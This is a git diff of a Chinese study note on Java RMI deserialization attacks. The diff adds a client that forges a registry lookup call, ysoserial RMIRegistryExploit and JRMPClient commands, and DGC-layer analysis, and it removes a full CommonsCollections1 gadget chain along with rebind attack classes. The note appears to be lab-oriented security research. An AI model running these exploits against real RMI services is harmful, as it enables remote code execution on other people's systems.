@@ -1,5 +1,11 @@
 ## RMI相关知识总结
 
+### 前言
+
+* 本文没有结合JDNI注入
+* 本文没有详细分析JRMI协议
+* 本文没有分析基于T3协议的RMI
+
 ### 介绍
 
 * RMI简介：远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，例如CORBA、WebService，这两种是独立于编程语言的。而Java RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。
@@ -649,140 +655,368 @@ public class URLDNSAttackRegister {
 
 ##### lookup和unbind
 
+在利用bookup和unbind时和bind以及rebind不一样的是只能传入String类型，以lookup为例，这里我们可以通过伪造连接请求进行利用，即自己实现一个lookup方法来进行攻击，先看一下原始的lookup：
 
+```java
+// Registry_Stub#lookup 
+public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
+        try {
+            RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);
+
+            try {
+                ObjectOutput var3 = var2.getOutputStream();
+                var3.writeObject(var1);
+            } catch (IOException var18) {
+                throw new MarshalException("error marshalling arguments", var18);
+            }
+
+            super.ref.invoke(var2);
+
+            Remote var23;
+            try {
+                ObjectInput var6 = var2.getInputStream();
+                var23 = (Remote)var6.readObject();
+            } catch (IOException var15) {
+                throw new UnmarshalException("error unmarshalling return", var15);
+            } catch (ClassNotFoundException var16) {
+                throw new UnmarshalException("error unmarshalling return", var16);
+            } finally {
+                super.ref.done(var2);
+            }
+
+            return var23;
+        } catch (RuntimeException var19) {
+            throw var19;
+        } catch (RemoteException var20) {
+            throw var20;
+        } catch (NotBoundException var21) {
+            throw var21;
+        } catch (Exception var22) {
+            throw new UnexpectedException("undeclared checked exception", var22);
+        }
+    }
+```
+
+参照该方法实现攻击代码
+
+```java
+import org.example.payload.CC1;
+import sun.rmi.server.UnicastRef;
+
+import java.io.ObjectOutput;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+import java.rmi.server.Operation;
+import java.rmi.server.RemoteCall;
+import java.rmi.server.RemoteObject;
+
+
+public class Client {
+
+    public static void main(String[] args) throws Exception {
+
+        InvocationHandler evalObject  = (InvocationHandler) CC1.getObject();
+        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject);
+        String host = "192.168.110.146";
+        int port = 1099;
+
+
+        Registry registry = LocateRegistry.getRegistry(host,port);
+
+        // 获取ref
+        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
+        fields_0[0].setAccessible(true);
+        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);
+
+        //获取operations
+
+        Field[] fields_1 = registry.getClass().getDeclaredFields();
+        fields_1[0].setAccessible(true);
+        Operation[] operations = (Operation[]) fields_1[0].get(registry);
+
+        // 伪造lookup的代码，去伪造传输信息
+        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
+        ObjectOutput var3 = var2.getOutputStream();
+        var3.writeObject(proxyEvalObject);
+        ref.invoke(var2);
+    }
+}
+```
+
+##### 使用ysoserial进行攻击
+
+ysoserial提供了现成的exp进行攻击，利用了bind方法。使用该工具时，注意目标是否满足gadgat链的java版本要求和依赖要求
+
+```shell
+java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections1 "calc.exe"
+```
+
+#### <jdk8u121,<JDK7u13,<JDK6u141版本下RMI DGC层反序列化
+
+##### DGC简介
+
+> DGC 是 Java RMI (Remote Method Invocation) 框架中的一个重要部分，用于管理和回收远程对象的内存。
+>
+> 在 Java RMI 中，远程对象可以被多个客户端同时引用。DGC 的主要作用是在分布式环境中追踪这些远程对象的引用情况，确保当没有客户端再引用某个远程对象时，该对象可以被垃圾回收。
+>
+> **Lease (租约)**：
+>
+> - 每个客户端在使用远程对象时，会向服务器申请一个租约。租约是一个时间段，表示客户端声明在这个时间段内需要保持对该远程对象的引用。
+> - 服务器将为每个远程对象维护一个引用计数器，这个计数器记录了当前有效的租约数量。
+>
+> **Renewal (续约)**：
+>
+> - 当租约快到期时，客户端需要定期向服务器续约，以延长对远程对象的引用。如果客户端不再需要引用远程对象，就不再续约。
+>
+> **Expiration (租约到期)**：
+>
+> - 如果客户端没有在租约到期前续约，服务器将认为客户端不再需要引用该远程对象，并减少该对象的引用计数器。
+> - 当引用计数器归零时，意味着没有客户端再引用该远程对象，服务器可以将该远程对象标记为可回收，并在适当的时间由垃圾回收器（GC）回收。
+
+有两个和DGC相关的重要方法：
+
+> ### `dirty` 方法
+>
+> #### 作用：
+>
+> `dirty` 方法用于通知 DGC 服务，有新的客户端开始引用某个远程对象，或者现有的客户端希望续约它的租约。这可以看作是在分布式环境中声明“这个对象仍然需要保留”。
+>
+> #### 过程：
+>
+> 1. **客户端调用**： 当一个客户端第一次引用某个远程对象时，或者希望延长对该对象的引用时，会调用 `dirty` 方法。
+> 2. **参数**：
+>    - **对象引用（object references）**：客户端希望标记为活跃状态的远程对象。
+>    - **租约时间（lease duration）**：客户端希望保持引用的时间长度。
+> 3. **返回值**：
+>    - 服务器会返回一个新的租约时间，表示服务器允许该引用保持的时间长度。
+>
+> ### `clean` 方法
+>
+> #### 作用：
+>
+> `clean` 方法用于通知 DGC 服务，某个客户端不再引用远程对象。这相当于告诉 DGC 服务“这个对象现在可以被垃圾回收”。
+>
+> #### 过程：
+>
+> 1. **客户端调用**： 当客户端不再需要某个远程对象时，会调用 `clean` 方法，以减少服务器上该对象的引用计数。
+> 2. **参数**：
+>    - **对象引用（object references）**：客户端不再需要引用的远程对象。
+> 3. **清理过程**：
+>    - 服务器收到 `clean` 请求后，会检查对象的引用计数。如果引用计数降为零，该对象将被标记为可回收，并最终由垃圾回收器清理。
+
+RMI的DGC的续约和不再引用的消息传递也是基于JRMI协议的，而且根据上面的描述，实现相应功能的dirty和clean方法都用到了远程对象，他们是否会和之前一样，序列化后通过JRMI协议传递，引起反序列化问题呢？
+
+##### DGC反序列化分析
+
+ysoserial的exploit.JRMPClient是基于DGC反序列化进行攻击的，我们启动它攻击Register，并在Register侧打上断点，分析调用栈。
+
+```java
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections1 "calc.exe"
+```
+
+![lQLPJwnmnAvoYDvNAg7NApCwBaZ5qZPYJZQGrBE2KDoZAA_656_526](./images/lQLPJwnmnAvoYDvNAg7NApCwBaZ5qZPYJZQGrBE2KDoZAA_656_526.png)
+
+很熟悉的调用栈，DGCImpl_Skel的命名方式也很熟悉，查看其dispatch方法，和RegisterImpl_Skel的结构很相似，这里同样存在反序列化的操作
+
+```java
+public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
+        if (var4 != -669196253586618813L) {
+            throw new SkeletonMismatchException("interface hash mismatch");
+        } else {
+            DGCImpl var6 = (DGCImpl)var1;
+            ObjID[] var7;
+            long var8;
+            switch (var3) {
+                case 0:
+                    VMID var39;
+                    boolean var40;
+                    try {
+                        ObjectInput var14 = var2.getInputStream();
+                        var7 = (ObjID[])var14.readObject();
+                        var8 = var14.readLong();
+                        var39 = (VMID)var14.readObject();
+                        var40 = var14.readBoolean();
+                    } catch (IOException var36) {
+                        throw new UnmarshalException("error unmarshalling arguments", var36);
+                    } catch (ClassNotFoundException var37) {
+                        throw new UnmarshalException("error unmarshalling arguments", var37);
+                    } finally {
+                        var2.releaseInputStream();
+                    }
+
+                    var6.clean(var7, var8, var39, var40);
+
+                    try {
+                        var2.getResultStream(true);
+                        break;
+                    } catch (IOException var35) {
+                        throw new MarshalException("error marshalling return", var35);
+                    }
+                case 1:
+                    Lease var10;
+                    try {
+                        ObjectInput var13 = var2.getInputStream();
+                        var7 = (ObjID[])var13.readObject();
+                        var8 = var13.readLong();
+                        var10 = (Lease)var13.readObject();
+                    } catch (IOException var32) {
+                        throw new UnmarshalException("error unmarshalling arguments", var32);
+                    } catch (ClassNotFoundException var33) {
+                        throw new UnmarshalException("error unmarshalling arguments", var33);
+                    } finally {
+                        var2.releaseInputStream();
+                    }
+
+                    Lease var11 = var6.dirty(var7, var8, var10);
+
+                    try {
+                        ObjectOutput var12 = var2.getResultStream(true);
+                        var12.writeObject(var11);
+                        break;
+                    } catch (IOException var31) {
+                        throw new MarshalException("error marshalling return", var31);
+                    }
+                default:
+                    throw new UnmarshalException("invalid method number");
+            }
+        }
+    }
+```
+
+相对应的，我们去找DGCImpl_Stun中的dirty和clean方法，和之前的bind、unbind、lookup等方法的实现很类似，而且同样找到了writeObject
+
+```java
+public void clean(ObjID[] var1, long var2, VMID var4, boolean var5) throws RemoteException {
+        try {
+            RemoteCall var6 = super.ref.newCall(this, operations, 0, -669196253586618813L);
+
+            try {
+                ObjectOutput var7 = var6.getOutputStream();
+                var7.writeObject(var1);
+                var7.writeLong(var2);
+                var7.writeObject(var4);
+                var7.writeBoolean(var5);
+            } catch (IOException var8) {
+                throw new MarshalException("error marshalling arguments", var8);
+            }
+
+            super.ref.invoke(var6);
+            super.ref.done(var6);
+        } catch (RuntimeException var9) {
+            throw var9;
+        } catch (RemoteException var10) {
+            throw var10;
+        } catch (Exception var11) {
+            throw new UnexpectedException("undeclared checked exception", var11);
+        }
+    }
+
+    public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
+        try {
+            RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
+
+            try {
+                ObjectOutput var6 = var5.getOutputStream();
+                var6.writeObject(var1);
+                var6.writeLong(var2);
+                var6.writeObject(var4);
+            } catch (IOException var20) {
+                throw new MarshalException("error marshalling arguments", var20);
+            }
+
+            super.ref.invoke(var5);
+
+            Lease var24;
+            try {
+                ObjectInput var9 = var5.getInputStream();
+                var24 = (Lease)var9.readObject();
+            } catch (IOException var17) {
+                throw new UnmarshalException("error unmarshalling return", var17);
+            } catch (ClassNotFoundException var18) {
+                throw new UnmarshalException("error unmarshalling return", var18);
+            } finally {
+                super.ref.done(var5);
+            }
+
+            return var24;
+        } catch (RuntimeException var21) {
+            throw var21;
+        } catch (RemoteException var22) {
+            throw var22;
+        } catch (Exception var23) {
+            throw new UnexpectedException("undeclared checked exception", var23);
+        }
+    }
+```
+
+于是有相同的思路，我们利用dirty或clean发送恶意的序列化对象攻击Register。这里没有和bind、rebind类似的封装好的方法，可以方便我们直接发起一个DGC层的请求，之前利用lookup进行攻击的过程中，也遇到了类似的问题，我们自己实现了一个类似lookup的方法，可以序列化任意对象，其实还有另一种思路，尝试直接构建JRMI协议层数据包。我们看一下ysoserial的代码实现：
+
+```java
+public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException {
+        InetSocketAddress isa = new InetSocketAddress(hostname, port);
+        Socket s = null;
+        DataOutputStream dos = null;
+        try {
+            //建立一个socket通道，并为赋值
+            s = SocketFactory.getDefault().createSocket(hostname, port);
+            s.setKeepAlive(true);
+            s.setTcpNoDelay(true);
+		   //读取socket通道的数据流
+            OutputStream os = s.getOutputStream();
+            dos = new DataOutputStream(os);
+ 	 	   //*******开始拼接数据流*********
+            //以下均为特定协议格式常量
+            //传输魔术字符：0x4a524d49（代表协议）
+            dos.writeInt(TransportConstants.Magic);
+            //传输协议版本号：2（就是版本号）
+            dos.writeShort(TransportConstants.Version);
+            //传输协议类型: 0x4c (协议的种类，好像是单向传输数据，不需要TCP的ACK确认)
+            dos.writeByte(TransportConstants.SingleOpProtocol);
+            //传输指令-RMI call：0x50 
+            dos.write(TransportConstants.Call);
+
+            @SuppressWarnings ( "resource" )
+            final ObjectOutputStream objOut = new MarshalOutputStream(dos);
+
+            objOut.writeLong(2); // DGC的固定读取格式
+            objOut.writeInt(0);
+            objOut.writeLong(0);
+            objOut.writeShort(0);
+
+            objOut.writeInt(1); // dirty
+            objOut.writeLong(-669196253586618813L);
+            
+            objOut.writeObject(payloadObject);
+
+            os.flush();
+        }
+        finally {
+            if ( dos != null ) {
+                dos.close();
+            }
+            if ( s != null ) {
+                s.close();
+            }
+        }
+    }
+```
+
+这里poc代码就不再给出，直接利用ysoserial进行攻击即可
 
 ##### 使用ysoserial进行攻击
 
 ```shell
-java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 1099 CommonsCollections1 "calc.exe"
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections1 "calc.exe"
 ```
 
-ysoserial提供了现成的exp进行攻击，利用了bind方法。使用该工具时，注意目标是否满足gadgat链的java版本要求和依赖要求
-
-#### Server通过bind、rebind攻击Register
-
-#### 攻击原理
-
-##### 低于jdk8u121版本下的攻击
 
 
-
-###### 常见gadget链的攻击
-
-使用CC1攻击的poc代码如下
-
-```java
-import org.example.payload.CC1;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
-import java.net.MalformedURLException;
-import java.rmi.Naming;
-import java.rmi.Remote;
-import java.rmi.RemoteException;
-
-public class CC1AtackRegister  {
-    public static void main(String[] args) throws RemoteException, MalformedURLException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
-        // CC1.getObject()返回值是CC1的恶意对象
-        InvocationHandler evalObject  = (InvocationHandler) CC1.getObject();
-        // 由于rebind的参数类型的限制，这里需要在恶意对象外包裹一层Remote
-        // 因为CC1的恶意对象实现了接口InvocationHandler，这里可以使用动态代理的方式将其封装
-        // 因为反序列化存在传递性，当proxyEvalObject被反序列化时，evalObject也会被反序列化，自然也会执行poc链
-        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject);
-        String host = "rmi://192.168.110.146:1099/";
-        Naming.rebind(host+"CC1", proxyEvalObject);
-    }
-}
-```
-
-```java
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.TransformedMap;
-import java.lang.annotation.Retention;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationTargetException;
-import java.util.HashMap;
-import java.util.Map;
-
-public class CC1 {
-    public static Object getObject() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
-        Transformer[] transformers = new Transformer[] {
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[] { String.class,
-                        Class[].class }, new
-                        Object[] { "getRuntime",
-                        new Class[0] }),
-                new InvokerTransformer("invoke", new Class[] { Object.class,
-                        Object[].class }, new
-                        Object[] { null, new Object[0] }),
-                new InvokerTransformer("exec", new Class[] { String.class },
-                        new String[] {
-                                "calc.exe" }),
-        };
-
-        Transformer transformerChain = new
-                ChainedTransformer(transformers);
-
-        Map innerMap = new HashMap();
-
-        // new
-        innerMap.put("value", "xxxx");
-        // new
-
-        Map outerMap = TransformedMap.decorate(innerMap, null,
-                transformerChain);
-
-        Class clazz =
-                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
-        construct.setAccessible(true);
-        Object obj = construct.newInstance(Retention.class, outerMap);
-        return obj;
-    }
-
-}
-```
-
-从CC1的poc代码可以看出，构建poc代码的一个关键点在于如何将我们的恶意对象包装为实现了Remote接口的类，CC1由于本身的特殊性，最终生成的对象实现了InvocationHandler接口，借助动态代理可以很容易的包装为任意类。其他没有利用AnnotationInvocationHandler的gadget链如何包装了，这里我们可以借鉴ysoserial的做法，它其实也是使用了Annot
-
-ationInvocationHandler将我们生成的恶意对象又包装了一层。以URLDNS为例，poc代码如下:
-
-```java
-import org.example.payload.URLDNS;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Proxy;
-import java.rmi.Naming;
-import java.rmi.Remote;
-import java.util.HashMap;
-import java.util.Map;
-
-public class URLDNSAttackRegister {
-    public static void main(String[] args) throws Exception {
-        String url = "";
-        HashMap obj = (HashMap) new URLDNS().getObject(url);
-
-        Map<String, Object> map = new HashMap<String, Object>();
-        map.put("DNSURL", obj);
-
-        Class clazz =
-                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-        Constructor construct = clazz.getDeclaredConstructor(Class.class,
-                Map.class);
-        construct.setAccessible(true);
-        InvocationHandler handler = (InvocationHandler)
-                construct.newInstance(Override.class, map);
-        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, handler);
-        String host = "rmi://192.168.110.146:1099/";
-        Naming.rebind(host+"URLDNS", proxyEvalObject);
-    }
-}
-```
-
-##### jdk8u121<=version<jdk8u141
+#### jdk8u121<=version<jdk8u141
 
 如果启动register服务的jdk版本为8u121，我们仍然使用之前的poc进行攻击，发现攻击失败，而且返回的异常信息和之前也不同。
 
@@ -800,7 +1034,7 @@ public class URLDNSAttackRegister {
 - Java™ SE Development Kit 7, Update 131 (JDK 7u131)
 - Java™ SE Development Kit 6, Update 141 (JDK 6u141)
 
-###### JEP290
+##### JEP290
 
 JEP290是来限制能够被反序列化的类，主要包含以下几个机制：
 
@@ -818,7 +1052,7 @@ JEP可以通过以下几种方式设置：
 3. 通过代码为特定的ObjectInputStream设置过滤器
 4. 配置文件设置
 
-###### jdk8u121中的为RMI的特定代码设置过滤器
+##### jdk8u121中的为RMI的特定代码设置过滤器
 
 jdk8u121中，是通过上述的方法3来修复RMI的反序列化漏洞，这里很粗略地分析一下这个过程。
 
@@ -842,7 +1076,7 @@ jdk8u121中，是通过上述的方法3来修复RMI的反序列化漏洞，这�
 
 ![image-20240815201629692](./images/image-20240815201629692.png)
 
-###### 绕过反序列化过滤器进行攻击
+##### 绕过反序列化过滤器进行攻击
 
 ##### jdk8u141<=version<jdk8u231
 
@@ -875,6 +1109,8 @@ jdk8u121中，是通过上述的方法3来修复RMI的反序列化漏洞，这�
 #### 对于server的攻击
 
 #### 对于client的攻击
+
+## 回显马的编写
 
 ## 借助BaRMIe对RMI进行攻击
 
